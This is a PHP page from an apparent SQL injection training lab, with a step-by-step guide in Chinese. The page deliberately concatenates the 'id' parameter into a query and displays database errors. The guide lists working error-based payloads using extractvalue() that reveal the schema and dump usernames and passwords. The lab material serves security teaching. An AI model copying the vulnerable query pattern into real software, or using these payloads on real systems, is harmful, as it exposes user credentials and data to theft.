<?php
header("Content-Type: text/html; charset=utf-8");
$mysqli = new mysqli("db", "sqli", "sqli123", "sqli_lab");
$mysqli->set_charset("utf8mb4");

if ($mysqli->connect_error) {
    die("連線失敗: " . $mysqli->connect_error);
}

$id = $_GET['id'] ?? '';

echo "<h2>🔍 items.php - Error-Based SQL Injection 測試</h2>";

$query = "SELECT title, description, body FROM items WHERE id = $id";
echo "<p><strong>執行的 SQL：</strong><code>" . $query . "</code></p>";

if ($id !== '') {
    $result = $mysqli->query($query);

    if ($result) {
        if ($result->num_rows > 0) {
            echo "<table border='1' cellpadding='6' cellspacing='0'>";
            echo "<tr><th>標題</th><th>描述</th><th>內容</th></tr>";
            while ($row = $result->fetch_assoc()) {
                echo "<tr>";
                echo "<td>" . $row['title'] . "</td>";
                echo "<td>" . $row['description'] . "</td>";
                echo "<td>" . $row['body'] . "</td>";
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "<p style='color:orange;'>⚠️ 查無資料（但 SQL 語法正確）</p>";
        }
    } else {
        echo "<p style='color:red;'>❌ SQL 錯誤：{$mysqli->error}</p>";
    }
} else {
    echo "<p style='color:gray;'>請在網址加上 <code>?id=1</code> 開始測試。</p>";
}
?>

<hr>
<h3>💡 Error-Based SQL Injection 攻擊步驟教學：</h3>

<h4>Step 1 — 確認注入點</h4>
<ul>
  <li><code>?id=1'</code> ← 加單引號，觀察是否報錯</li>
  <li><code>?id=1 and 1=1</code> ← 條件為真，有結果</li>
  <li><code>?id=1 and 1=2</code> ← 條件為假，無結果</li>
</ul>

<h4>Step 2 — 用 extractvalue() 取出資料</h4>
<ul>
  <li><code>?id=1 and extractvalue(1,concat(0x7e,(select database())))</code> ← 目前資料庫名稱</li>
  <li><code>?id=1 and extractvalue(1,concat(0x7e,(select version())))</code> ← 資料庫版本</li>
  <li><code>?id=1 and extractvalue(1,concat(0x7e,(select user())))</code> ← 目前使用者</li>
</ul>

<h4>Step 3 — 列出資料表</h4>
<ul>
  <li><code>?id=1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))</code></li>
  <li><code>?id=1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1)))</code> ← 第二張表</li>
</ul>

<h4>Step 4 — 列出欄位</h4>
<ul>
  <li><code>?id=1 and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)))</code></li>
</ul>

<h4>Step 5 — 傾倒資料</h4>
<ul>
  <li><code>?id=1 and extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1)))</code></li>
</ul>

<p>✅ 提示：<code>0x7e</code> 是 <code>~</code> 符號，讓錯誤訊息中的資料更易辨識。</p>
<p>⚠️ extractvalue() 每次只能回傳 32 字元，長字串需搭配 <code>substr()</code> 分段讀取。</p>
<p><a href="index.php">← 回到總覽</a></p>
